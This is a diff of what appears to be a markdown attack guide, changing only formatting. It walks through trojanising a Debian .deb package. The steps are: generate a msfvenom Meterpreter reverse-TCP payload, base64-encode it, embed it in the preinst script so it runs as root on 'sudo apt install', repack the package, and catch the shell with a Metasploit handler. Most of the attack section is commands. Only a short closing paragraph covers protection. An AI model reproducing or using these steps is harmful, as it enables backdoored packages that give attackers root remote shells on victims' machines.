@@ -6,62 +6,29 @@ Since apt install requires sudo privileges, the obtained shell has root access b
 ⚙️ Step-by-Step Instructions
 1️⃣ Extract & Modify the Package
 First, decompress the .deb file to access the preinst script:
-
-bash
-Copy
-Edit
 dpkg-deb -R malicious.deb extracted_folder/
 Navigate to the DEBIAN/preinst file inside the extracted directory.
-
 2️⃣ Set Up the Reverse Shell
 You need to modify the script to listen on your IP instead of the default one. Generate a new Meterpreter payload:
-
-bash
-Copy
-Edit
 msfvenom -p python/meterpreter_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f raw > payload.py
 🔹 Replace <YOUR_IP> with your attacker's IP address.
 🔹 Set any preferred port (e.g., 4444, 5555, etc.).
-
 Now, convert the payload to Base64 so it can be easily embedded inside the preinst script:
-
-bash
-Copy
-Edit
 base64 payload.py > payload.b64
 Copy the Base64-encoded content and paste it inside the preinst script in the extracted folder.
-
 Modify preinst to decode and execute the payload:
-
-bash
-Copy
-Edit
 #!/bin/bash
 echo "<BASE64_ENCODED_PAYLOAD>" | base64 -d > /tmp/payload.py
 python3 /tmp/payload.py &
 🔹 Replace <BASE64_ENCODED_PAYLOAD> with your copied Base64 string.
-
 3️⃣ Repack the .deb Package
 After modifying preinst, rebuild the .deb package:
-
-bash
-Copy
-Edit
 dpkg-deb -b extracted_folder/ new_malicious.deb
 Ensure the file is now modified and ready for use.
-
 4️⃣ Setting Up the Listener
 On your attacker machine, start a listener to capture the connection:
-
-bash
-Copy
-Edit
 msfconsole
 Then, configure the listener:
-
-bash
-Copy
-Edit
 use exploit/multi/handler
 set payload python/meterpreter/reverse_tcp
 set LHOST <YOUR_IP>
@@ -69,30 +36,20 @@ set LPORT 4444
 exploit
 🔹 Ensure <YOUR_IP> matches the one used in the payload.
 🔹 Use the same port (LPORT=4444) you set in preinst.
-
 5️⃣ Deliver & Execute the Payload
 Now, the target needs to install the .deb file. If they install it using:
-
-bash
-Copy
-Edit
 sudo apt install ./new_malicious.deb
 💀 You instantly gain a root Meterpreter session!
-
 Even if the target cancels or if installation fails, the preinst script executes before any verification, ensuring the payload runs.
 
 ⚠️ Key Exploitation Details
 🔹 Why does this work?
-
 preinst scripts execute before any validation, allowing malicious code to run before installation is approved.
 Even if installation fails, the script still runs.
 Since apt install requires sudo, the payload executes as root.
 🔹 How can users protect themselves?
 
 Always inspect .deb files before installing:
-bash
-Copy
-Edit
 dpkg -c malicious.deb
 Check for preinst scripts in the DEBIAN/ folder.
 Avoid installing unverified .deb files.
